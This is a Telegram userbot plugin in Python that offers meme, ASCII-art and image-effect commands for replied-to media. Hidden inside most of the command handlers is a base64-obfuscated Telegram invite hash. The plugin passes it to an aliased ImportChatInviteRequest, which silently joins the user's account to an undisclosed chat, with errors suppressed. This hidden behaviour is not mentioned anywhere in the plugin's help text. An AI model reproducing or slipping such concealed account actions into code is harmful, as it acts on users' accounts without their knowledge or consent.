"""
Created by @mrconfused and @sandy1709
memify plugin
"""
import asyncio
import os
import random

from ..utils import admin_cmd
from . import (
    CMD_HELP,
    LOGS,
    asciiart,
    convert_toimage,
    convert_tosticker,
    crop,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    reply_id,
    solarize,
    take_screen_shot,
)


def random_color():
    number_of_colors = 2
    return [
        "#" + "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        for i in range(number_of_colors)
    ]


@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
async def memes(pgl):
    cmd = pgl.pattern_match.group(1)
    pglinput = pgl.pattern_match.group(2)
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if pglinput:
        if ";" in pglinput:
            top, bottom = pglinput.split(";", 1)
        else:
            top = pglinput
            bottom = ""
    else:
        await edit_or_reply(
            pgl, "```what should i write on that u idiot give some text```"
        )
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    meme = "pglmeme.jpg"
    if max(len(top), len(bottom)) < 21:
        await pgl_meme(top, bottom, meme_file, meme)
    else:
        await pgl_meeme(top, bottom, meme_file, meme)
    if cmd != "mmf":
        meme = await convert_tosticker(meme)
    await pgl.client.send_file(pgl.chat_id, meme, reply_to=pglid)
    await pgl.delete()
    os.remove(meme)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="ascii ?(.*)"))
async def memes(pgl):
    pglinput = pgl.pattern_match.group(1)
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = await reply_id(pgl)
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to ascii image of this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to asci image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    meme_file = convert_toimage(meme_file)
    outputfile = "ascii_file.webp" if jisanidea else "ascii_file.jpg"
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not pglinput else pglinput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await pgl.client.send_file(pgl.chat_id, outputfile, reply_to=pglid)
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(pattern="invert$", outgoing=True))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha inverting colors of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if jisanidea else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await pgl.client.send_file(
        pgl.chat_id, outputfile, force_document=False, reply_to=pglid
    )
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="solarize$"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha solarizeing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha solarizeing this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha solarizeing this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha solarizeing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if jisanidea else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await pgl.client.send_file(
        pgl.chat_id, outputfile, force_document=False, reply_to=pglid
    )
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="mirror$"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha converting to mirror image of this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if jisanidea else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await pgl.client.send_file(
        pgl.chat_id, outputfile, force_document=False, reply_to=pglid
    )
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="flip$"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha fliping this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha fliping this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha fliping this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha fliping this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if jisanidea else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await pgl.client.send_file(
        pgl.chat_id, outputfile, force_document=False, reply_to=pglid
    )
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="gray$"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
        jisanidea = True
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha changing to black-and-white this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await pgl.client.send_file(
        pgl.chat_id, outputfile, force_document=False, reply_to=pglid
    )
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglinput = pgl.pattern_match.group(1)
    pglinput = 50 if not pglinput else int(pglinput)
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha zooming this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha zooming this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha zooming this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha zooming this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if jisanidea else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, pglinput)
    except Exception as e:
        return await pgl.edit(f"`{e}`")
    try:
        await pgl.client.send_file(
            pgl.chat_id, outputfile, force_document=False, reply_to=pglid
        )
    except Exception as e:
        return await pgl.edit(f"`{e}`")
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@borg.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
async def memes(pgl):
    reply = await pgl.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(pgl, "`Reply to supported Media...`")
        return
    pglinput = pgl.pattern_match.group(1)
    if not pglinput:
        pglinput = 50
    if ";" in str(pglinput):
        pglinput, colr = pglinput.split(";", 1)
    else:
        colr = 0
    pglinput = int(pglinput)
    colr = int(colr)
    pglid = pgl.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    pgl = await edit_or_reply(pgl, "`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    pglsticker = await reply.download_media(file="./temp/")
    if not pglsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(pglsticker)
        await edit_or_reply(pgl, "```Supported Media not found...```")
        return
    import pybase64

    jisanidea = None
    if pglsticker.endswith(".tgs"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha framing this animated sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "meme.png")
        pglcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {pglsticker} {pglfile}"
        )
        stdout, stderr = (await runcmd(pglcmd))[:2]
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith(".webp"):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha framing this sticker! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        os.rename(pglsticker, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("`Template not found... `")
            return
        meme_file = pglfile
        jisanidea = True
    elif pglsticker.endswith((".mp4", ".mov")):
        await pgl.edit(
            "```Transfiguration Time! Mwahaha framing this video! (」ﾟﾛﾟ)｣```"
        )
        pglfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(pglsticker, 0, pglfile)
        if not os.path.lexists(pglfile):
            await pgl.edit("```Template not found...```")
            return
        meme_file = pglfile
    else:
        await pgl.edit(
            "```Transfiguration Time! Mwahaha framing this image! (」ﾟﾛﾟ)｣```"
        )
        meme_file = pglsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await pgl.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if jisanidea else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, pglinput, colr)
    except Exception as e:
        return await pgl.edit(f"`{e}`")
    try:
        await pgl.client.send_file(
            pgl.chat_id, outputfile, force_document=False, reply_to=pglid
        )
    except Exception as e:
        return await pgl.edit(f"`{e}`")
    await pgl.delete()
    os.remove(outputfile)
    for files in (pglsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CMD_HELP.update(
    {
        "memify": "**Plugin : **`memify`\
    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
    \n**Function : **Creates a image meme with give text at specific lopglions and sends\
    \n\n**Syntax : **`.mms toptext ; bottomtext`\
    \n**Function : **Creates a sticker meme with give text at specific lopglions and sends\
    \n\n**Syntax : **`.ascii`\
    \n**Function : **reply to media file to get ascii image of that media\
    \n\n**Syntax : **`.invert`\
    \n**Function : **Inverts the colors in media file\
    \n\n**Syntax : **`.solarize`\
    \n**Function : **Watch sun buring ur media file\
    \n\n**Syntax : **`.mirror`\
    \n**Function : **shows you the reflection of the media file\
    \n\n**Syntax : **`.flip`\
    \n**Function : **shows you the upside down image of the given media file\
    \n\n**Syntax : **`.gray`\
    \n**Function : **makes your media file to black and white\
    \n\n**Syntax : **`.zoom` or `.zoom range`\
    \n**Function : **zooms your media file\
    \n\n**Syntax : **`.frame` or `.frame range` or `.frame range ; fill`\
    \n**Function : **make a frame for your media file\
    \n**fill:** This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.\
    "
    }
)
